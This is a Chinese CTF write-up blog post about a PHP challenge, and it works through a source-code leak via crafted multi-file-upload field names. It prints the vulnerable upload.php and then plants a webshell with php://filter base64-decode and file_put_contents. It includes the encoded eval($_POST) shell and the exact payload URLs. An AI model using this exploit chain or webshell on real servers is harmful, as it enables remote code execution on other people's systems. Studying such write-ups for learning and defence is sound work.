---
title: sangebaimao之火币网
date: 2016-07-17 15:41:39
tags:
- php
- sangebaimao
- php伪协议
- file_put_contents
categories:
- Blogs
---

题目在wooyun峰会上就放出来了，在上周orange菊苣和一众师傅讨论的结果下，才终于有了第一步的路，虽然没能力拿下一血，但是还是磕磕绊绊的做出来了...

<!--more-->

# 多文件上传导致的php源码泄露 #

## 原理 ##
根据上周各位师傅们的讨论，找到这个洞

[https://bugs.php.net/bug.php?id=49683](https://bugs.php.net/bug.php?id=49683)

还有一篇文章

[https://nealpoole.com/blog/2011/10/directory-traversal-via-php-multi-file-uploads/](https://nealpoole.com/blog/2011/10/directory-traversal-via-php-multi-file-uploads/)

根据第二篇文章直接复现环境（事实证明和原环境相差非常小），由于foreach的关系，如果我们构造pictures[tmp_name][，然后定义filename就是把tmp_name改成filename中的值...

![](/img/sangebaimao/2_2.png)

我们看到tmp_name被改写了，所以我们可以通过这种方式控制每个字段的内容...

## 读源码？ ##

但是在第二篇文章中输出是通过
```
$tmp_name = $_FILES["pictures"]["tmp_name"][$key];
$name = $_FILES["pictures"]["name"][$key];
echo "move_uploaded_file($tmp_name, \"$uploads_dir/$name\");";
```
本地测试通过，线上失败了（╯－＿－）╯╧╧

稍微测试下发现存在name存在性判定，让我们来看看后来读到的源码
```
if (!empty($_FILES["homework"]["name"][$key]))
		{	
			$filename = htmlspecialchars($_FILES["homework"]["name"][$key]);
			$tmpFile = $_FILES["homework"]["tmp_name"][$key];
			//$size =  $_FILES["homework"]["size"][$key];
		//	echo $tmpFile;
			$content = base64_encode(file_get_contents($tmpFile));
			$echoCentent[] = $content;
			if(!empty($content))
			{
				$sql = "insert into homework(`filename`,`content`,`time`) values('".$filename."','".$content."','".$nowtime."')";
				if(!mysql_query($sql))
				{
					die('hello hacker!');
				}
			}
			
		}
```
前面多了一句判断`if (!empty($_FILES["homework"]["name"][$key]))`

线上测试可以通过fuzz判断，于是payload是这样的
![](/img/sangebaimao/2_1.png)

下面出现了base64的源码...

upload.php
```
<?php
error_reporting(E_ALL^E_NOTICE^E_WARNING);
include 'init.php';

$nowtime = time();
if(is_array($_FILES) && !empty($_FILES))
{
	//var_dump($_FILES);
	foreach($_FILES["homework"]["name"] as $key => $name) 
	{
		if (!empty($_FILES["homework"]["name"][$key]))
		{	
			$filename = htmlspecialchars($_FILES["homework"]["name"][$key]);
			$tmpFile = $_FILES["homework"]["tmp_name"][$key];
			//$size =  $_FILES["homework"]["size"][$key];
		//	echo $tmpFile;
			$content = base64_encode(file_get_contents($tmpFile));
			$echoCentent[] = $content;
			if(!empty($content))
			{
				$sql = "insert into homework(`filename`,`content`,`time`) values('".$filename."','".$content."','".$nowtime."')";
				if(!mysql_query($sql))
				{
					die('hello hacker!');
				}
			}
			
		}
	}
}

if(isset($_GET['download']) and isset($_GET['filename']))
{
	$download = addslashes(htmlspecialchars_decode($_GET['download']));
	$filename = addslashes(htmlspecialchars_decode($_GET['filename']));
	if(file_exists($filename))
	{
		unlink($filename);
	}
	$sql = "select content from homework where id='$download'";
	$result = mysql_query($sql);
	while($row = mysql_fetch_array($result))
	{
		
		$devalContents = "<?php die; ?>\n"; 
		$devalContents .= base64_decode($row['content']);
		file_put_contents("$filename",$devalContents);
		$filename = str_replace("upload/",'',$filename);
		header("location:upload/".urlencode($filename));
	}
	$sql = "delete from homework where id='$download';";
	if(!mysql_query($sql))
	{
		die("hello hacker!");
	}
	
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
    <head>
        <title>暑假作业上传系统</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        <meta name="description" content="Expand, contract, animate forms with jQuery wihtout leaving the page" />
        <meta name="keywords" content="expand, form, css3, jquery, animate, width, height, adapt, unobtrusive javascript"/>
		<link rel="shortcut icon" href="../favicon.ico" type="image/x-icon"/>
        <link rel="stylesheet" type="text/css" href="css/style.css" />
		<script src="js/cufon-yui.js" type="text/javascript"></script>
		<script src="js/ChunkFive_400.font.js" type="text/javascript"></script>
		<script type="text/javascript">
			Cufon.replace('h1',{ textShadow: '1px 1px #fff'});
			Cufon.replace('h2',{ textShadow: '1px 1px #fff'});
			Cufon.replace('h3',{ textShadow: '1px 1px #000'});
			Cufon.replace('.back');
		</script>
    </head>
    <body>
		<div class="wrapper">
			<h1>The system for summer jobs</h1><h2 style="text-align:right;"></h2>
			<div class="content" style="text-align:center;padding-left:200px;width:500px">
			<div id="form_wrapper" class="form_wrapper"></div>
			<br/>
			
			<div style="text-align:center;width" >		
				</div>
				<br/>
				<div>注意:上传文件名请使用姓名加学号的方式上传，如:钢蛋2016098121.pdf<div>
						<br/>
						<br>
						<br/>
						<br>
					<form action = "index.php" method = "POST" enctype = "multipart/form-data">
						<span>语文作业：</span>
						<input type = "file" name  = "homework[]">
						<br/>
						<br>
						<span>数学作业：</span>
						<input type = "file" name  = "homework[]">
						<br/>
						<br>
						<span>英语作业：</span>
						<input type = "file" name  = "homework[]">
						<br/>
						<br>
						<span>其他作业：</span>
						<input type = "file" name  = "homework[]">
						<br/>
						<br>
						<div style="text-align:right">
						<br>
						<input type = "submit" value ="提交作业">
						</div>
					</form>
				<div class="clear"></div>
			</div>
			<div id="form_wrapper" class="form_wrapper"></div>
		        <div style="text-align:left">交作业情况（只显示最新提交10个人）：</div><br/><br>
			<div style="text-align:left">
			<?php
				$sql = "select id,filename from homework order by id desc limit 0,10;";
				$result = mysql_query($sql);
				while($row = mysql_fetch_array($result))
				{
					echo $row['id']."|".$row['filename']."|"."<a href=\"index.php?download={$row['id']}&filename=upload/".urlencode($row['filename'])."\">下载作业</a>"."<br/><br/>";
				}
			?>
			</div>
			<div id="form_wrapper" class="form_wrapper"></div>
			<div style="width:500px">
			<?php 
			if(!empty($echoCentent))
				echo json_encode($echoCentent);
			?>
			</div>
		</div>
    </body>
</html>

```

## 巧妙地方式？ ##
这里分析源码其实发现...下载的代码其实是有问题的...

读入文件的内容会插入数据库，然后再请求下载界面的时候，读出数据库内容写入filename，那么我们读入index.php的内容就可以写入test.txt，不会受到die()的影响，读到完整带有格式的源码...

其核心逻辑是这样的
```
if(isset($_GET['download']) and isset($_GET['filename']))
{
	$download = addslashes(htmlspecialchars_decode($_GET['download']));
	$filename = addslashes(htmlspecialchars_decode($_GET['filename']));
	if(file_exists($filename))
	{
		unlink($filename);
	}
	$sql = "select content from homework where id='$download'";
	$result = mysql_query($sql);
	while($row = mysql_fetch_array($result))
	{
		
		$devalContents = "<?php die; ?>\n"; 
		$devalContents .= base64_decode($row['content']);
		file_put_contents("$filename",$devalContents);
		$filename = str_replace("upload/",'',$filename);
		header("location:upload/".urlencode($filename));
	}
	$sql = "delete from homework where id='$download';";
	if(!mysql_query($sql))
	{
		die("hello hacker!");
	}
	
}
```

在类似于前面上传之后，请求对应的id
```
http://464e9b54c7a12250a.jie.sangebaimao.com/index.php?download=4101&filename=upload/test
```
get!

# php://filter/write配合file_put_contents getshell #

仔细分析上面的代码，发现核心逻辑在
```
$devalContents = "<?php die; ?>\n"; 
		$devalContents .= base64_decode($row['content']);
		file_put_contents("$filename",$devalContents);
		$filename = str_replace("upload/",'',$filename);
		header("location:upload/".urlencode($filename));
```

配合hint2简直蒙蔽。。。

分析逻辑感觉问题还是在file_put_contents

无意中找到了这篇文章

[http://www.myhack58.com/Article/html/3/7/2011/30898.htm](http://www.myhack58.com/Article/html/3/7/2011/30898.htm)

一下打通了任督二脉。。。

只要传入shell的base64，然后解码，前面的die就会解成乱码，然后getshell

尝试
```
PD9waHAgZWNobyAyMzM7IGV2YWwoJF9QT1NUWydzcyddKTsgPz4=
```
payload
```
http://464e9b54c7a12250a.jie.sangebaimao.com/upload/php://filter/write=convert.base64-decode/resource/resource=upload/ddog.php
```
咦？乱码了。。。

想了一会儿才想起来base64有padding，如果长度不对就会解成乱码，那就python尝试一下吧...

最终文件内容
```
ssPD9waHAgZWNobyAyMzM7IGV2YWwoJF9QT1NUWydzcyddKTsgPz4=
```
payload
```
http://464e9b54c7a12250a.jie.sangebaimao.com/upload/php://filter/write=convert.base64-decode/resource/resource=upload/ddog.php
```

getshell....